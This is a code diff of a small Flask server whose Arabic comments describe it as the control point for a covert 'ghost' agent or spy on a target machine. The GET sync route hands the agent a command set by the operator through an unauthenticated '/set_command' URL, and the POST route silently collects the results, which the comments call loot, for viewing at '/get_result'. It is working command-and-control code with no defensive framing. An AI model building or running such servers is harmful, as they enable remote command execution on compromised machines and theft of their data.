@@ -2,40 +2,45 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# جدول لتخزين الأوامر والنتائج الخاصة بالأهداف
-command_queue = {}
-last_results = {}
+# متغير لتخزين الأمر المؤقت في الذاكرة السحابية
+current_command = "No orders yet"
+latest_result = ""
 
+@app.route('/', methods=['GET'])
+def home():
+    return "HELLO, WORLD!"
+
+# مسار المزامنة الخاص بالعميل والجاسوس
 @app.route('/api/v1/sync', methods=['GET', 'POST'])
-def sync_with_agent():
-    agent_id = request.headers.get("X-Agent-ID", "UNKNOWN_TARGET")
-    
+def sync_command():
+    global current_command, latest_result
+
     if request.method == 'POST':
-        # استقبال نتائج تنفيذ الأوامر من الهدف بصمت
-        result_data = request.json.get("result", "")
-        last_results[agent_id] = result_data
+        # استقبال النتائج والغنائم القادمة من العميل الشبحي
+        data = request.json
+        if data and "result" in data:
+            latest_result = data["result"]
+            print(f"[+] Result received: {latest_result}")
         return jsonify({"status": "received"}), 200
-        
-    else:
-        # إرسال الأمر المعلق للهدف عند وصول نبضته
-        cmd = command_queue.get(agent_id, "echo 'No orders yet'")
-        if agent_id in command_queue:
-            del command_queue[agent_id] # مسح الأمر بعد سحبه
+
+    elif request.method=='GET':
+        # إرسال الأمر الحالي للعميل الشبحي عند طلبه
+        cmd = current_command
         return cmd, 200
 
-@app.route('/command', methods=['POST'])
-def send_command():
-    # بوابتك من هاتفك لإعطاء الأوامر
-    data = request.json
-    agent_id = data.get("agent_id")
-    cmd = data.get("cmd")
-    command_queue[agent_id] = cmd
-    return jsonify({"status": "Command queued successfully"}), 200
+# مسار مخصص لك لزرع الأمر الجديد في السيرفر
+@app.route('/set_command', methods=['GET'])
+def set_cmd():
+    global current_command
+    cmd = request.args.get('cmd', 'No orders yet')
+    current_command = cmd
+    return f"Command set to: {cmd}", 200
 
-@app.route('/results/<agent_id>', methods=['GET'])
-def get_results(agent_id):
-    # استعراض غنائم ونتائج الهدف على هاتفك
-    return jsonify({"last_output": last_results.get(agent_id, "No data yet")})
+# مسار للاطلاع على الغنائم والنتائج التي أرسلها العميل
+@app.route('/get_result', methods=['GET'])
+def get_res():
+    global latest_result
+    return f"<pre>{latest_result}</pre>", 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
